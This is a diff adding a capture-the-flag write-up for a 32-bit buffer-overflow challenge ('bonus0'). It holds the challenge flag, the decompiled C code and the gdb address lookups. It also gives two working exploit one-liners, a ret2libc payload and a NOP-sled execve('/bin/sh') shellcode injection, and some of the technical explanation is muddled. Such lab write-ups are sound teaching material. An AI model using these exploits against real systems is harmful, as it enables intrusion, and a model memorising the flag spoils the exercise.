@@ -1,0 +1,100 @@
+flag: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+This first bonus is a buffer overflow.
+We are confronted to a buffer of size 54, The program reads the stdin two times and
+concatenates the two strings in the buffer, interpolling them with a space.
+We could be tempted to just do the basic shellcode + epi overwrite but it is impossible
+here as our shellcode to execute a shell is 45 bytes and the two buffers read by stdin
+are strictly limited to 20 bytes.
+
+What we can do however is a ret2libc.
+We will overflow the first of the two buffers who are concatenated together, because as it is first in the stack, it should have eip right after its 20 bytes.
+
+
+
+
+int main() {
+	char buff[54];
+	pp(buff);
+	puts(buff);
+}
+
+void pp(char *buff) {
+	char start[20];
+	char end[20];
+
+	p(start);
+	p(end);
+
+	strcpy(buff, start);
+	buff+strlen(start) = ' ';
+	strcat(buff, end);
+}
+
+void p(char *buff) {
+	char *reader[4104];
+
+	read(0, reader, 4096);
+	*strchr(reader, '\n') = '\0';
+	strncpy(buff, reader, 20);
+}
+AAAAAAAAAAAAAAAAAAAAAAAAA
+
+putting a lot of 'A' together seems to create a buffer overflow that overwrite epi.
+The offset is 16 in the second read, Found it by spamming the As because for an unknown reason the pattern doesn't work.
+> It's because writing 20 A forces the first buffer to skip the '\0', so strcpy reads
+the second buffer too when it copies the first string in the buffer.
+So the first string is then 36 characters, plus the space it's 37. The 16 of the string makes it 53 chars. then it is not overflowing. But add one char to the second string and it adds it on both sides, reaching 55 chars and overflowing.
+
+We want to give it 8 bytes for the ret2libc: The address of system and the address of
+/bin/sh
+
+[20 bytes][12 bytes padding][8 bytes][1 byte][1 byte space][12 bytes padding][8 bytes][1 byte]
+[20 bytes][9 bytes padding][8 bytes][7 bytes padding][1 byte space][9 bytes padding][8 bytes][7 bytes padding]
+
+
+
+In gdb, we can get the address of system with
+> p system
+which returns us 0xb7e6b060
+
+We can also get the address of the "/bin/sh" string using this atrocious command:
+> find __libc_start_main,+99999999,"/bin/sh"
+which returns us 0xb7f8cc58
+
+exit's addr: 0xb7e5ebe0
+
+
+What we want to do is calling system and passing it /bin/sh as an argument. So we give
+to eip the address of /bin/sh and to eax the address of /bin/sh. Both of them will be
+popped to their stack value, the one we overwrote.
+
+(python -c 'print "A"*20'; python -c 'print "A"*9+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"+"A"*3'; cat) | ./bonus0
+
+
+
+We do not have the necessary size to execute the shellcode exploit. The only solution is
+to rely on the stack not destroying itself after each function.
+In the first call to p, there is a buffer with a size of 4104 where the read data are
+stored.
+In the second call, the first read data are still there, so we have to overwrite eip
+to make it point toward the data we did not overwrite with the second read where we'll
+put a shellcode.
+
+\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
+
++61 => erased by the stack because 20+20 +1 +20
+addr: 0xbfffe670
++70: 0xbfffe6b6
+
+It overflows after the nineth character because:
+- The first 20 bytes of the buffer1
+- The overflow causes the program to continue reading the stack, so it reads all the
+second buffer and the address passed as a parameter to pp
+- Then the space
+- And finally the true second buffer, 20 characters large.
+
+=> 20 + 20 + 4 + 1 = 45
+The buffer being 54 bytes long, It overflow after the 9th character.
+
+(python -c 'print "\x90"*70+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; python -c 'print "A"*9+"\xb6\xe6\xff\xbf"+"A"*7'; cat) | ./bonus0
